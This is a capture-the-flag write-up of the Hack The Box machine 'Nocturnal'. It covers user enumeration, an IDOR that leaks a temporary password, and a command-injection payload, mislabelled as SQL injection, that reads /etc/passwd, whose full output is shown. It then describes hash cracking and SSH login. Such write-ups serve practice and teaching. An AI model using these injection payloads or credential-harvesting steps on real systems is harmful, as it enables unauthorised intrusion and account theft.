# Write-up: Nocturnal from Hack The Box (Linux, easy machine)

### I started with a very simple nmap scan (nmap -sC -sV @ip):

![htb](https://github.com/user-attachments/assets/32684602-99fa-453d-baea-af0ae210f711)

### Trying to acces port 80 (web app)

I tried accessing the website in my browser, but it did not let me access the file (because of DNS or something like that)

I could only acces the website after changing /etc/hosts file by adding the ip and website link (ip 10.10.10.X for example, and then nocturnal.htb). So make sure to modify your hosts file, otherwise you wont be able to access the website locally!

When I got access to the website I went straight into checking the functionality, I scanned existing names with the python script in the file I attached (test.py). The script scans if the names in the wordlist are used on the web app.

You can run the script with:

```
To run: python3 test.py <cookies_here>
```

And make sure to replace <cookies_here> with the cookies (inspect > storage > local > get the cookie value)

After scanning the names I got back: admin, amanda, tobias.


### Continuing with the information I had found

I found that the website (when authorized) allowed you to access /view.php (which did not give me any information, but it had a custom UI, so it meant something). If I assigned values for user and file, it would show me what user the files had. I did not even have to specify which file. It would tell me if that file existed, and regardless of that answer I could see other files of that user.

So when I went to: 

```http://nocturnal.htb/view.php?user=amanda&file=e.pdf```

I found a file named: "privacy.odt" which was a mail which had a temporary password for amanda.

I tried logging in with the details provided (into the web app), and succesfully logged in!

I then saw that there was a admin panel option for amanda.

### Admin panel

When I went to the admin panel, I saw a field where if I entered a password, it would give me a backup of the files of the web app. So I entered the same login credentials provided from the mail (privacy.odt) and succesfully got the zip.

I analyzed the php files, and could notice that there were many input fields to inject some SQL into. So thats what I did!

### SQL-injection

I started with running this into the backup files field:

```password=test%0Acat%09/etc/passwd%09>%09../uploads/passwd.txt```

I got this back:

```
sh: 2: ../uploads/passwd.txt: not found
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
smmta:x:115:120:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:116:121:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Which means that the commands were working!

After running some other commands I got access to the userIds, and md5 hashes of the users. I decrypted the hashes with crackstation and got access to tobias account.

### Access to tobias account

I continued in a new terminal with the following:

```
ssh tobias@ip
```

and I entered the password, and BOOM! I have access to his files (or in other words, I have access to user.txt which contains the user flag!)

I did this with ls and then cat > user.txt!





After I got the user.txt I forgot to document how I got the root flag, but I will give you a tip!

Tip: ISPConfig panel

Very fun Machine on Hack The Box!
Hope this helps!
